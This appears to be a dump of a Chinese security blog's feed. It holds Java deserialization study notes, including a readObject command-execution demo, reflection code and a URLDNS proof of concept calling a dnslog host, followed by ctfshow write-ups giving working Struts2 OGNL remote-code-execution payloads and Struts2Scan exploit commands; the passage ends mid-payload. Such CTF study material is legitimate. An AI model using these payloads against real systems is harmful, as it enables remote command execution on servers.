class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>UnserializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化的话会把对象变成字节序列(字符串或者二进制文件)</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话为什么java反序列化会产生安全问题？</p><p>只要服务端会反序列化数据的话，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><p><strong>可能的形式</strong></p><p>1.<strong>入口类</strong>的readObject直接调用危险方法</p><p>(1   这里的话就是对person类里的readObject函数进行重写，然后在里面加上一条命令执行的语句)</p><p>2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</p><p>3.入口类参数中包含可控类，该类又调用其他又危险方法的类，readObject时调用</p><p>比如类型定义为Object,调用equals/hashcode/toString</p><p>重点 相同类型 同名函数</p><p>(2   3都是类似套娃一样的，一层套一层的类)</p><p>4.构造函数/静态代码块等类加载时隐式执行</p><p>1.共同条件 继承Serializable</p><p>2.入口类条件 source(重写readObject 参数类型广泛 最好jdk自带) —-&gt;  Map HashMap  HashTable   <a href="https://zhuanlan.zhihu.com/p/84533476">HashMap为什么要重写readObject</a></p><p>3.调用链 gadget chain  <strong>相同名称 相同类型</strong></p><p>4.执行类 sink (rce ssrf 写文件等等)</p><p>这里的话我是根据这两篇文章来看着跟进的 <a href="https://blog.csdn.net/qq_47886905/article/details/123531299">文章1</a> <a href="https://blog.csdn.net/cosmoslin/article/details/122838465">文章2</a> <a href="https://www.anquanke.com/post/id/201762">文章三</a></p><p><strong>这两篇文章中写的put函数方法，put函数里的东西就有putVal函数，然后这时候就会进行dns请求，然后hashcode值就会被改变，导致最后readObject里的hash(key)不会进行dns请求</strong></p><p>这两篇文章里是利用java的<strong>反射</strong>来修改 hashcode值</p><p><a href="https://cloud.tencent.com/developer/article/1614318">反射的文章</a></p><p><strong>反射</strong></p><p>反射的作用：让java具有动态性</p><p>修改已有对象的属性</p><p>动态生成对象</p><p>动态调用方法</p><p>操作内部类和私有方法</p><p>在反序列化漏洞中的应用：</p><p>定制需要的对象</p><p>通过invoke调用除了同名函数以外的函数</p><p>通过Class类创建对象，引入不能序列化的类</p><p><strong>反射学习写的代码</strong>  视频  <a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=bacfffe46b930fda5761b63367eb298c">反射</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class里面实例化对象</span></span><br><span class="line">        <span class="comment">//c.newInstance(); --&gt; 这个实例化对象是不能传参的</span></span><br><span class="line">        c.getConstructor();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        <span class="comment">//System.out.println(p);</span></span><br><span class="line">        <span class="comment">//获取类里面属性</span></span><br><span class="line">        <span class="comment">//Field[] personfiled = c.getFields(); //这个函数的话只可以获取公有属性，私有的不行</span></span><br><span class="line"><span class="comment">//        Field[] personfiled = c.getDeclaredFields();  //私有和公有都能获取</span></span><br><span class="line"><span class="comment">//        for(Field f:personfiled)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//          System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125; 这些都是数组</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>); <span class="comment">//getField  和  getDeclaredFields都不能修改里边的值，因为是私有属性</span></span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);  <span class="comment">//这是允许修改私有属性的值</span></span><br><span class="line">        namefield.set(p,<span class="number">23</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] personmethod = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for(Method m:personmethod)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125; 查看这个类里</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);<span class="comment">//如果把person类里边的action函数换成private,那就etDeclaredMethod,然后通过setAccessible(true);修改权限</span></span><br><span class="line">            actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            actionmethod.invoke(p,<span class="string">&quot;ggaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>学习中用到的代码</strong>(URLDNS的poc)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3rzcpr.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;rmb122&quot;</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要jdk8 来进行运行</p><p><a href="https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C%EF%BC%9AJava%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java%20Reflection%EF%BC%89.md">github上反射的详细文章</a></p><p><strong>这里的知识点对应着web846</strong>   payload可以去看羽师傅写的博客</p><h2 id="cc链"><a href="#cc链" class="headerlink" title="cc链"></a>cc链</h2><p>jdk动态代理</p><p><a href="https://zhuanlan.zhihu.com/p/567962124">文章</a>   这里就不多写了，  因为这篇文章已经写的很清楚了    </p><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=3&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频</a>  这里的话是讲的很明白了  这里有很多都是套路写法</p><h3 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h3><p>视频讲解   <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;URLDNS&quot;&gt;&lt;a href=&quot;#URLDNS&quot; class=&quot;headerlink&quot; title=&quot;URLDNS&quot;&gt;&lt;/a&gt;URLDNS&lt;/h2&gt;&lt;p&gt;java里的&lt;code&gt;implements&lt;/code&gt;和c++里的那个继承是一个意思，就是会继承前者里的</summary>
      
    
    
    
    
    <category term="ctfshow java反序列化" scheme="https://ke1nys.github.io/tags/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell</title>
    <link href="https://ke1nys.github.io/posts/2f610211.html"/>
    <id>https://ke1nys.github.io/posts/2f610211.html</id>
    <published>2023-02-24T10:43:53.000Z</published>
    <updated>2023-02-24T10:43:53.729Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow-JAVA 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/1c639bd.html"/>
    <id>https://ke1nys.github.io/posts/1c639bd.html</id>
    <published>2023-02-21T13:56:45.000Z</published>
    <updated>2023-02-24T12:30:36.101Z</updated>
    
    <content type="html"><![CDATA[<p><strong>脚本通杀</strong></p><p>  <strong>WEB279-294 296-297</strong></p><p>以下题目参考 ——&gt; <a href="https://blog.csdn.net/q20010619/article/details/120729447">文章</a></p><p>全部题都是struts2框架漏洞</p><p>脚本通杀 下载 下载链接：<a href="https://pan.b类似/aidu.com/s/19yr0tWbG1UU_ULjEan5ttQ">https://pan.b类似/aidu.com/s/19yr0tWbG1UU_ULjEan5ttQ</a> 提取码：bn71<br>具体用法在md文件中，例如<br>检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action -n S2-001 --exec</span><br></pre></td></tr></table></figure><p><strong>执行命令env即可得到flag</strong></p><p>Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架</p><p>关于struts2漏洞，vulhub都有环境并且给出了漏洞原理和poc</p><p>GitHub项目地址：<a href="https://github.com/vulhub/vulhub/tree/master/struts2">https://github.com/vulhub/vulhub/tree/master/struts2</a></p><p><strong>判断网站是否基于Struts2的方法</strong></p><p>通过页面回显的错误消息来判断，页面不回显错误消息时则无效<br>通过网页后缀来判断，如.do.action，有可能不准<br>如果配置文件中常数extension的值以逗号结尾或者有空值，指明了action可以不带后缀，那么不带后缀的uri也可能是struts2框架搭建的<br>如果使用Struts2的rest插件，其默认的struts-plugin.xml指定的请求后缀为xhtml,xml和json<br>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true</p><p><strong>这里的话也记录一下我学习java的过程</strong></p><h2 id="web279-S2-001"><a href="#web279-S2-001" class="headerlink" title="web279-S2-001"></a>web279-S2-001</h2><p>题目</p><p><img src="../images/image-20230221220243509.png" alt="image-20230221220243509"></p><p>打开源码发现</p><p>存在一个路径，然后访问得到</p><p><img src="../images/image-20230221220331569.png" alt="image-20230221220331569"></p><p>s2-001是一个struts2命令执行漏洞编号，这篇文章给了详细介绍<a href="https://www.freebuf.com/column/224041.html">链接</a></p><p><strong>漏洞原理</strong></p><blockquote><p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据</p></blockquote><p>这里的话和ssti还有点像，因为就是  <strong>%{1+1}</strong>   可以生成2   这是个<strong>OGNL表达式</strong></p><p>这里的话会对下面三个东西进行解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% 的用途是在标志的属性为字符串类型时，计算OGNL表达式%&#123;&#125;中的值</span><br><span class="line"># 的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</span><br><span class="line">$ 主要是在Struts 2配置文件中，引用OGNL表达式</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取tomcat路径</span></span><br><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取web路径</span></span><br><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行 env，flag就在其中</span></span><br><span class="line">password=%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=<span class="number">1</span></span><br><span class="line"><span class="comment">//这里的命令执行就是修改env就行了，相查啥就去修改</span></span><br></pre></td></tr></table></figure><p>这里的话虽然payload看不懂什么意思，但是得把里面一些东西进行研究研究</p><p><a href="https://blog.csdn.net/weixin_43748564/article/details/107375850">“@” Java中的特殊符号——注解（Java中’@‘符号是什么意思？）</a></p><p><a href="https://blog.csdn.net/u012834750/article/details/79361552">java.lang包介绍</a></p><p><a href="https://zhuanlan.zhihu.com/p/98094713">一篇彻底读懂java中的IO流！</a></p><p>也可以利用工具进行解题</p><h2 id="web280-S2-005"><a href="#web280-S2-005" class="headerlink" title="web280-S2-005"></a>web280-S2-005</h2><p>题目</p><p><img src="../images/image-20230221223022301.png" alt="image-20230221223022301"></p><p><strong>漏洞原理</strong></p><p>先来了解下S2-003</p><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</p><p><strong>影响版本：Struts 2.0.0 - Struts 2.0.11.2</strong></p><p>再看S2-005，<a href="https://www.freebuf.com/vuls/193078.html">参考链接</a></p><p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p><p><strong>影响版本</strong>：<strong>Struts 2.0.0 - Struts 2.1.8.1</strong></p><p>这题的话是利用工具来解题的</p><p>查漏洞 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://d6000b7a-d2b5-47b4-<span class="number">8133</span>-e503ee337f51.challenge.ctf.show/S2-005/example/HelloWorld.action</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230221224315378.png" alt="image-20230221224315378"></p><p>利用网上的工具得出确实是存在<strong>S2-005</strong>漏洞</p><p>那么直接利用工具打就行了。</p><p>利用漏洞进行命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://33f274f4-42ec-4646-a3e0-5670b693959b.challenge.ctf.show/S2-005/example/HelloWorld.action -n S2-005 --exec</span><br></pre></td></tr></table></figure><p>然后输入env就可以看到flag了。</p><p><img src="../images/image-20230222102511636.png" alt="image-20230222102511636"></p><h2 id="web281-S2-007"><a href="#web281-S2-007" class="headerlink" title="web281-S2-007"></a>web281-S2-007</h2><p><strong>漏洞原理</strong></p><blockquote><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回</p><p><strong>影响版本</strong>：Struts2 2.0.0 - Struts2 2.2.3</p></blockquote><p>执行任意代码poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>id<span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在id处修改命令就行</p><p><img src="../images/image-20230222103018669.png" alt="image-20230222103018669"></p><p>在age处可以进行输出。</p><p>然后把id修改成env就可以看到flag了。</p><p>用工具其实也是可以的</p><p><strong>查漏洞</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://016b938b-1b04-<span class="number">4939</span>-bfbf-d66ff6df2ccf.challenge.ctf.show/S2-007/user.action</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230222103423727.png" alt="image-20230222103423727"></p><p>但是利用工具来看的话这里不是s2-007漏洞，有点奇怪。</p><p><img src="../images/image-20230222103701552.png" alt="image-20230222103701552"></p><h2 id="web282-S2-008"><a href="#web282-S2-008" class="headerlink" title="web282-S2-008"></a>web282-S2-008</h2><p>题目</p><p><img src="../images/image-20230222104319076.png" alt="image-20230222104319076"></p><p><strong>漏洞原理</strong></p><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的</p><p><strong>姿势1</strong></p><p>虽然在struts2没有对恶意代码进行限制，但是java的webserver（Tomcat），对cookie的名称有较多限制，在传入struts2之前就被处理，从而较为鸡肋</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:(<span class="string">&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Aluvion; (<span 